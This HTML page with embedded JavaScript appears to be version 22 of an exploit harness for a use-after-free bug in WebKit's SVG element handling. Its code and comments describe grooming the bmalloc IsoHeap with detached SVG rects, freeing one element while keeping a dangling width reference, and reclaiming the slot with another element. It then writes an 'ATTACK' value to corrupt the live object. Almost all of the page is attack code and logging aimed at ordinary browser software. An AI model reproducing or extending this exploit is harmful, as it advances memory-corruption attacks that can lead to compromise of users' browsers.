<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>SVG UAF v22</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
h2{color:#ff4141;font-size:11px;letter-spacing:2px;text-transform:uppercase}
.sub{color:#555;font-size:10px;margin-bottom:8px}
#controls{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:8px}
button{background:#111;border:1px solid #333;color:#00ff41;padding:5px 12px;cursor:pointer;font-family:monospace;font-size:10px}
button:hover:not(:disabled){border-color:#00ff41}
button:disabled{opacity:.3}
#log{font-size:10px;line-height:1.6;white-space:pre-wrap;word-break:break-all;margin-top:6px}
.ok{color:#00ff41}.bad{color:#ff4141}.inf{color:#ffcc00}.dim{color:#444}.sep{color:#222}
</style>
</head>
<body>
<h2>SVG UAF v22 - detached exhaust, forced IsoHeap reuse</h2>
<div class="sub">v21: exhaust rects in live DOM get layout-culled. v22: detached elements pin C++ obj in IsoHeap without render.</div>
<svg id="livesvg" width="1" height="1" style="position:fixed;opacity:0;pointer-events:none"></svg>
<div id="controls">
  <button onclick="runDET()">DET detached-exhaust</button>
  <button onclick="runMIX()">MIX mixed-exhaust</button>
  <button onclick="runFRE()">FRE free-then-reuse</button>
  <button onclick="runCOR()">COR live-corrupt</button>
  <button onclick="runAll()">RUN ALL</button>
  <button onclick="copyLog()">COPY</button>
  <button onclick="clearLog()">CLR</button>
</div>
<div id="log"></div>
<script>
var SVG_NS = 'http://www.w3.org/2000/svg';
var Lel = document.getElementById('log');
var livesvg = document.getElementById('livesvg');

function log(m, c) {
  var s = document.createElement('span');
  if (c) s.className = c;
  s.textContent = m + '\n';
  Lel.appendChild(s);
  Lel.scrollTop = Lel.scrollHeight;
}
function sep() { log('----------------------------------------------------', 'sep'); }
function raf() { return new Promise(function(r){ requestAnimationFrame(r); }); }
function micro() { return new Promise(function(r){ queueMicrotask(r); }); }
function wait(ms) { return new Promise(function(r){ setTimeout(r, ms); }); }

function copyLog() {
  try { navigator.clipboard.writeText(Lel.innerText); } catch(e) {
    var a = document.createElement('textarea');
    a.value = Lel.innerText;
    document.body.appendChild(a); a.select();
    document.execCommand('copy'); a.remove();
  }
}
function clearLog() { Lel.innerHTML = ''; }
function dis(d) {
  var btns = document.querySelectorAll('button');
  for (var i = 0; i < btns.length; i++) {
    var fn = btns[i].getAttribute('onclick') || '';
    if (fn.indexOf('copy') === -1 && fn.indexOf('clear') === -1) btns[i].disabled = d;
  }
}
window.onerror = function(m, u, l, c) { log('[CRASH] ' + m + ' L' + l + ':' + c, 'bad'); return false; };

/*
 * WHY v21 FAILED:
 *   Exhaust rects were appended to live SVG in DOM.
 *   WebKit layout pass runs on every raf() -> culls off-screen/zero-size rects.
 *   RenderObject destroyed -> C++ element may get freed early OR moved.
 *   IsoPage bump never truly exhausted because objects don't stay alive.
 *
 * v22 KEY INSIGHT:
 *   document.createElementNS() allocates the C++ SVGRectElement in bmalloc IsoHeap.
 *   As long as a JS reference holds the JS wrapper, the C++ object stays alive.
 *   NO appendChild needed. No render. No layout. No GC.
 *   Pure heap pressure: 4096 detached rects = 4096 C++ SVGRectElement objects in IsoHeap.
 *
 * ALSO: bmalloc IsoHeap free list is LIFO (last in, first out).
 *   Free A -> A goes to top of free list.
 *   Next alloc of same type -> pops A from free list -> B = A's slot.
 *   BUT only if current IsoPage bump is EXHAUSTED first.
 *   Detached rects exhaust the bump without getting culled.
 *
 * METHODS:
 *   DET: alloc N detached rects (JS array keeps alive), then alloc A in DOM, free A, alloc B detached
 *        check if animLen_A reads B's width
 *   MIX: alloc N detached, free HALF (fills free list with N/2 slots), alloc A, free A, alloc B
 *        with N/2 free slots already present, A's free goes on top -> B pops A's slot
 *   FRE: alloc N detached, free ALL N (fills free list completely), alloc A, free A, alloc B
 *        free list is full of old slots; A goes on top; B should pop A
 *   COR: once reuse confirmed, write ATTACK via animLen_A, read via B's own interface
 */

function mkDetached(w) {
  var r = document.createElementNS(SVG_NS, 'rect');
  r.setAttribute('width', '' + (w || 10));
  r.setAttribute('height', '10');
  return r;
}

function mkLive(w) {
  var r = document.createElementNS(SVG_NS, 'rect');
  r.setAttribute('width', '' + (w || 80));
  r.setAttribute('height', '80');
  livesvg.appendChild(r);
  return r;
}

function checkReuse(bv_A, A_w, B_w) {
  var curr = null;
  try { curr = bv_A ? bv_A.value : null; } catch(e) {}
  var reused = curr !== null && curr !== A_w && Math.abs(curr - B_w) < 1;
  return { curr: curr, reused: reused };
}

// DET: detached exhaust, B also detached
async function runDET(q) {
  if (!q) { dis(true); sep(); log('DET: detached exhaust - JS array pins C++ objs in IsoHeap', 'inf'); sep(); }
  log('[*] createElementNS without appendChild - no render, no layout, no GC', 'ok');
  log('[*] exhaust counts: 512, 1024, 2048, 4096', 'ok');
  log('');

  var found = -1;
  var counts = [512, 1024, 2048, 4096];

  for (var ci = 0; ci < counts.length; ci++) {
    var N = counts[ci];

    // Exhaust: detached rects, held in JS array
    var exhaust = [];
    for (var xi = 0; xi < N; xi++) {
      exhaust.push(mkDetached(10 + (xi % 100)));
    }
    // Force JSC to not optimize away the array
    var dummy = exhaust[exhaust.length - 1].getAttribute('width');

    await micro();

    // Alloc A - detached
    var A = mkDetached(80);
    var bv_A = A.width ? A.width.baseVal : null;
    var A_w = bv_A ? bv_A.value : null;

    // Free A - remove JS ref (C++ freed on next GC or immediately)
    // We keep bv_A alive via closure
    A = null;

    // Force GC to actually free A's C++ object
    // Spray some garbage to trigger collection
    var gc_pressure = [];
    for (var gi = 0; gi < 100; gi++) gc_pressure.push(new Uint8Array(1024));
    gc_pressure = null;

    await micro();

    // Read freed value
    var freed_val = null;
    try { freed_val = bv_A ? bv_A.value : null; } catch(e) {}

    // Alloc B - detached, distinct width
    var B_W = 55;
    var B = mkDetached(B_W);
    var bv_B = B.width ? B.width.baseVal : null;

    await micro();

    var r = checkReuse(bv_A, A_w, B_W);
    log('  N=' + N + ': A_w=' + A_w + ' freed=' + freed_val + ' animLen_A=' + r.curr + ' reused=' + r.reused, r.reused ? 'bad' : 'dim');

    if (r.reused) {
      found = N;
      log('  [!!] SLOT REUSE via detached exhaust at N=' + N, 'bad');
      log('  animLen_A reads B_w=' + r.curr + ' (B is detached, never in DOM)', 'bad');

      // Write via animLen_A -> should corrupt B's C++ attr storage
      try { if (bv_A) bv_A.value = 9999; } catch(e) {}
      var bW = null;
      try { bW = bv_B ? bv_B.value : null; } catch(e) {}
      log('  write 9999 via animLen_A -> B.width.baseVal=' + bW, bW === 9999 ? 'bad' : 'inf');

      exhaust = null; B = null;
      break;
    }

    exhaust = null; B = null;
    await raf();
  }

  if (found === -1) log('  no reuse via detached exhaust up to 4096', 'inf');
  if (!q) dis(false);
  return { found: found };
}

// MIX: exhaust detached, free half, then A/B
async function runMIX(q) {
  if (!q) { dis(true); sep(); log('MIX: exhaust + free half, force LIFO free list', 'inf'); sep(); }
  log('[*] alloc N detached, free N/2 (fills free list), alloc A, free A, alloc B', 'ok');
  log('[*] A freed onto top of partially-full free list -> B pops A slot', 'ok');
  log('');

  var found = -1;
  var counts = [512, 1024, 2048, 4096];

  for (var ci = 0; ci < counts.length; ci++) {
    var N = counts[ci];

    // Alloc N detached
    var exhaust = [];
    for (var xi = 0; xi < N; xi++) {
      exhaust.push(mkDetached(10));
    }
    var dummy = exhaust[N-1].getAttribute('width');
    await micro();

    // Free second half (most recently allocated = top of bump)
    // This fills the free list with N/2 slots
    for (var fi = N/2; fi < N; fi++) {
      exhaust[fi] = null;
    }
    exhaust.length = N/2;

    // GC pressure to actually free
    var gc = [];
    for (var gi = 0; gi < 200; gi++) gc.push(new Uint8Array(512));
    gc = null;
    await micro();

    // Alloc A
    var A = mkDetached(80);
    var bv_A = A.width ? A.width.baseVal : null;
    var A_w = bv_A ? bv_A.value : null;

    // Free A
    A = null;
    var gc2 = [];
    for (var gi2 = 0; gi2 < 100; gi2++) gc2.push(new Uint8Array(512));
    gc2 = null;
    await micro();

    var freed_val = null;
    try { freed_val = bv_A ? bv_A.value : null; } catch(e) {}

    // Alloc B
    var B_W = 55;
    var B = mkDetached(B_W);
    await micro();

    var r = checkReuse(bv_A, A_w, B_W);
    log('  N=' + N + '/2: freed=' + freed_val + ' animLen_A=' + r.curr + ' reused=' + r.reused, r.reused ? 'bad' : 'dim');

    if (r.reused) {
      found = N;
      log('  [!!] SLOT REUSE via MIX at N=' + N, 'bad');
      try { if (bv_A) bv_A.value = 9999; } catch(e) {}
      var bW = null;
      try { bW = B.width ? B.width.baseVal.value : null; } catch(e) {}
      log('  write 9999 -> B.width.baseVal=' + bW, bW === 9999 ? 'bad' : 'inf');
      exhaust = null; B = null;
      break;
    }

    exhaust = null; B = null;
    await raf();
  }

  if (found === -1) log('  no reuse via MIX up to 4096', 'inf');
  if (!q) dis(false);
  return { found: found };
}

// FRE: alloc N detached, free ALL, then A/B
async function runFRE(q) {
  if (!q) { dis(true); sep(); log('FRE: alloc N detached, free ALL, then A lands on free list', 'inf'); sep(); }
  log('[*] free list full of N slots -> A alloc pops from free list -> A on a known page', 'ok');
  log('[*] free A -> goes to top of free list (LIFO) -> B pops A slot', 'ok');
  log('');

  var found = -1;
  var counts = [64, 128, 256, 512, 1024];

  for (var ci = 0; ci < counts.length; ci++) {
    var N = counts[ci];

    // Alloc N detached
    var exhaust = [];
    for (var xi = 0; xi < N; xi++) {
      exhaust.push(mkDetached(10));
    }
    var dummy = exhaust[N-1].getAttribute('width');
    await micro();

    // Free ALL - fill free list with N slots
    exhaust = null;

    // GC pressure
    var gc = [];
    for (var gi = 0; gi < 300; gi++) gc.push(new Uint8Array(1024));
    gc = null;
    await micro();
    await raf();

    // Alloc A - comes from free list (our exhausted pool)
    var A = mkDetached(80);
    var bv_A = A.width ? A.width.baseVal : null;
    var A_w = bv_A ? bv_A.value : null;

    // Free A immediately - LIFO: A goes to top of free list
    A = null;
    await micro();

    var freed_val = null;
    try { freed_val = bv_A ? bv_A.value : null; } catch(e) {}

    // Alloc B - should pop A's slot (top of LIFO free list)
    var B_W = 55;
    var B = mkDetached(B_W);
    var bv_B = B.width ? B.width.baseVal : null;
    await micro();

    var r = checkReuse(bv_A, A_w, B_W);
    log('  N=' + N + ': A_w=' + A_w + ' freed=' + freed_val + ' animLen_A=' + r.curr + ' reused=' + r.reused, r.reused ? 'bad' : 'dim');

    if (r.reused) {
      found = N;
      log('  [!!] SLOT REUSE via FRE at N=' + N, 'bad');
      log('  animLen_A reads B_w=' + r.curr, 'bad');

      // Confirm write corruption
      try { if (bv_A) bv_A.value = 9999; } catch(e) {}
      var bW = null;
      try { bW = bv_B ? bv_B.value : null; } catch(e) {}
      log('  write 9999 -> B.width.baseVal=' + bW, bW === 9999 ? 'bad' : 'inf');

      B = null;
      break;
    }

    B = null;
    await raf();
  }

  if (found === -1) log('  no reuse via FRE up to 1024', 'inf');
  if (!q) dis(false);
  return { found: found };
}

// COR: structured live corruption demo
async function runCOR(q) {
  if (!q) { dis(true); sep(); log('COR: structured live corruption via best method', 'inf'); sep(); }
  log('[*] try all exhaust methods, on first reuse: write ATTACK, verify B corrupted', 'ok');
  log('');

  var ATTACK = 31337.0;
  var corruptConfirmed = false;

  // Try each method with increasing exhaust
  var configs = [
    { method: 'DET-512',  N: 512,  free_mode: 'none' },
    { method: 'DET-1024', N: 1024, free_mode: 'none' },
    { method: 'FRE-128',  N: 128,  free_mode: 'all'  },
    { method: 'FRE-256',  N: 256,  free_mode: 'all'  },
    { method: 'MIX-512',  N: 512,  free_mode: 'half' },
    { method: 'DET-2048', N: 2048, free_mode: 'none' },
    { method: 'FRE-512',  N: 512,  free_mode: 'all'  },
    { method: 'DET-4096', N: 4096, free_mode: 'none' },
    { method: 'FRE-1024', N: 1024, free_mode: 'all'  }
  ];

  for (var ci = 0; ci < configs.length && !corruptConfirmed; ci++) {
    var cfg = configs[ci];
    var N = cfg.N;
    var mode = cfg.free_mode;

    var exhaust = [];
    for (var xi = 0; xi < N; xi++) exhaust.push(mkDetached(10));
    var dummy = exhaust[N-1].getAttribute('width');
    await micro();

    if (mode === 'all') {
      exhaust = null;
      var gc = [];
      for (var gi = 0; gi < 300; gi++) gc.push(new Uint8Array(1024));
      gc = null;
      await micro(); await raf();
    } else if (mode === 'half') {
      for (var fi = N/2; fi < N; fi++) exhaust[fi] = null;
      exhaust.length = N/2;
      var gc2 = [];
      for (var gi2 = 0; gi2 < 200; gi2++) gc2.push(new Uint8Array(512));
      gc2 = null;
      await micro();
    }

    // Alloc A detached
    var A = mkDetached(80);
    var bv_A = A.width ? A.width.baseVal : null;
    var bv_H = A.height ? A.height.baseVal : null;
    var A_w = bv_A ? bv_A.value : null;

    // Free A
    A = null;
    var gcA = [];
    for (var gai = 0; gai < 100; gai++) gcA.push(new Uint8Array(512));
    gcA = null;
    await micro();

    // Alloc B detached
    var B_W = 55;
    var B = mkDetached(B_W);
    var bv_B = B.width ? B.width.baseVal : null;
    await micro();

    var r = checkReuse(bv_A, A_w, B_W);
    log('  [' + cfg.method + ']: animLen_A=' + r.curr + ' reused=' + r.reused, r.reused ? 'bad' : 'dim');

    if (r.reused) {
      log('  [!!] REUSE CONFIRMED - writing ATTACK via animLen_A...', 'bad');

      // Write ATTACK into B's C++ attr storage via dangling ptr
      try { if (bv_A) bv_A.value = ATTACK; } catch(e) {}
      try { if (bv_H) bv_H.value = ATTACK + 1; } catch(e) {}
      await micro();

      // Read B through its own interface
      var bW_bv   = null; try { bW_bv   = bv_B ? bv_B.value : null; } catch(e) {}
      var bW_bbox = null; try { bW_bbox  = B.getBBox ? B.getBBox().width : null; } catch(e) {}
      var bH_bv   = null; try { bH_bv   = B.height ? B.height.baseVal.value : null; } catch(e) {}

      log('  B.width.baseVal  = ' + bW_bv   + ' (expected ' + ATTACK + ')',   bW_bv   === ATTACK ? 'bad' : 'ok');
      log('  B.getBBox().w    = ' + bW_bbox  + ' (expected ' + ATTACK + ')',   bW_bbox  === ATTACK ? 'bad' : 'ok');
      log('  B.height.baseVal = ' + bH_bv   + ' (expected ' + (ATTACK+1) + ')', bH_bv   === ATTACK+1 ? 'bad' : 'ok');

      if (bW_bv === ATTACK || bW_bbox === ATTACK || bH_bv === ATTACK + 1) {
        corruptConfirmed = true;
        log('  [!!] LIVE OBJECT CORRUPTION CONFIRMED', 'bad');
        log('  [!!] B.width=' + bW_bv + ' written from OUTSIDE B via UAF dangling ptr', 'bad');
        log('  [!!] method=' + cfg.method + ' exhaust=' + N, 'bad');
      } else {
        log('  reuse happened but B reads own values - B attr storage at different offset', 'inf');
        log('  [*] animLen_A write hits different field than B.width - need offset map', 'inf');
      }

      exhaust = null; B = null;
      break;
    }

    exhaust = null; B = null;
    await raf();
  }

  log('[*] COR: corruptConfirmed=' + corruptConfirmed, corruptConfirmed ? 'bad' : 'inf');

  if (!corruptConfirmed) {
    log('[*] no reuse achieved — C++ obj freed on JS null but GC not running fast enough', 'inf');
    log('[*] next: try explicit GC trigger or alloc A in live DOM after detached exhaust', 'inf');
  }

  if (!q) dis(false);
  return { corruptConfirmed: corruptConfirmed };
}

// RUN ALL
async function runAll() {
  dis(true); clearLog(); sep();
  log('SVG UAF v22 - detached exhaust, forced IsoHeap slot reuse', 'inf');
  sep();

  var results = {};
  var tests = [
    ['DET_detached_exhaust', runDET],
    ['MIX_mixed_exhaust',    runMIX],
    ['FRE_free_then_reuse',  runFRE],
    ['COR_live_corrupt',     runCOR]
  ];

  for (var i = 0; i < tests.length; i++) {
    var lbl = tests[i][0];
    var fn  = tests[i][1];
    sep();
    log(lbl, 'inf');
    sep();
    try {
      results[lbl] = await fn(true);
    } catch(e) {
      log('[!] ' + lbl + ': ' + e, 'bad');
      results[lbl] = null;
    }
    log('');
  }

  sep();
  log('SUMMARY v22', 'inf');
  sep();
  var keys = Object.keys(results);
  for (var ki = 0; ki < keys.length; ki++) {
    var k = keys[ki];
    var r = results[k];
    if (!r) { log('  ' + k + ': ERROR', 'bad'); continue; }
    var v = r.found !== undefined ? r.found :
            r.corruptConfirmed !== undefined ? r.corruptConfirmed : '?';
    var cls = (typeof v === 'number' && v > 0) || v === true ? 'bad' : 'dim';
    log('  ' + k + ': key=' + v, cls);
  }
  sep();
  dis(false);
}
</script>
